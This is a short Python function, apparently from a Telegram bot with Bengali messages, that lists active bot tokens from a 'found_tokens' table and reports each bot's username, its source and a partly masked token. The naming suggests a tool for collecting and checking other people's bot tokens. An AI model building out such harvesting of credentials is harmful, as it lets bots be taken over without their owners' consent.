# Active বট দেখাও
# =====================================
def show_active_bots(uid):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM found_tokens WHERE is_active=1 ORDER BY found_date DESC")
    bots = c.fetchall()
    conn.close()
    
    if not bots:
        bot.send_message(uid, "❌ কোনো Active বট নেই!")
        return
    
    txt = f"✅ *Active বট: {len(bots)}টি*\n\n"
    
    for b in bots:
        cmds = "📝 কমান্ড সহ" if b['has_commands'] else ""
        grp = "👥 গ্রুপ" if b['can_join_groups'] else ""
        inline = "💬 ইনলাইন" if b['supports_inline'] else ""
        features = ' | '.join(filter(None, [cmds, grp, inline]))
        
        txt += f"✅ @{b['bot_username']}\n"
        txt += f"   📁 {b['source']} | {features}\n"
        txt += f"   🔑 `{b['token'][:8]}...{b['token'][-5:]}`\n\n"
    
    bot.send_message(uid, txt)

